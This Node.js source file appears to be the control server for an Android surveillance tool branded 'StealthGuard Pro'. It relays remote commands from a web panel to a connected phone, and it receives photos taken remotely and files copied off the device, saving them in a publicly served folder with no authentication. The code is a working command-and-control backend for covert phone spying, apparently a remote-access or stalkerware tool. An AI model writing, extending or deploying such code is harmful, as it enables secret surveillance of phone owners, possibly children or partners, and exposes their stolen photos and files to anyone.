const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 1e8
});

let androidSocket = null;
let webSocket = null;

io.on('connection', (socket) => {
    const isWeb = socket.handshake.query.type === 'web';

    if (isWeb) {
        webSocket = socket;
        console.log(`[+] GUI CONNECTED`);
        if (androidSocket) webSocket.emit('device_status', { connected: true });

        socket.on('gui_command', (data) => {
            if (androidSocket) {
                androidSocket.emit('remote_command', data);
            } else {
                socket.emit('server_log', "Error: Device Offline!");
            }
        });

    } else {
        androidSocket = socket;
        console.log(`[+] ANDROID CONNECTED`);
        if (webSocket) webSocket.emit('device_status', { connected: true });

        socket.onAny((event, data) => {
            if (webSocket) webSocket.emit(event, data);
        });

        socket.on('child_photo_taken', (data) => {
            try {
                const buffer = Buffer.from(data.image, 'base64');
                fs.writeFileSync('public/captured_photo.jpg', buffer);
                console.log("[SAVED] New Remote Capture saved.");
                if (webSocket) webSocket.emit('child_photo_taken', { success: true });
            } catch (e) { console.error("Save error:", e); }
        });

        socket.on('file_data', (data) => {
            try {
                if (!fs.existsSync('public/downloads')) fs.mkdirSync('public/downloads');
                const buffer = Buffer.from(data.file_data, 'base64');
                const safeName = data.file_name.replace(/[^a-z0-9.]/gi, '_');
                fs.writeFileSync(`public/downloads/${safeName}`, buffer);
                if (webSocket) webSocket.emit('download_ready', { name: data.file_name });
            } catch (e) { console.error("Download error:", e); }
        });

        socket.on('disconnect', () => {
            console.log("[-] ANDROID DISCONNECTED");
            androidSocket = null;
            if (webSocket) webSocket.emit('device_status', { connected: false });
        });
    }

    socket.on('disconnect', () => {
        if (socket === webSocket) webSocket = null;
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n==========================================`);
    console.log(`STEALTHGUARD PRO SERVER ACTIVE`);
    console.log(`PORT: ${PORT}`);
    console.log(`==========================================\n`);
});
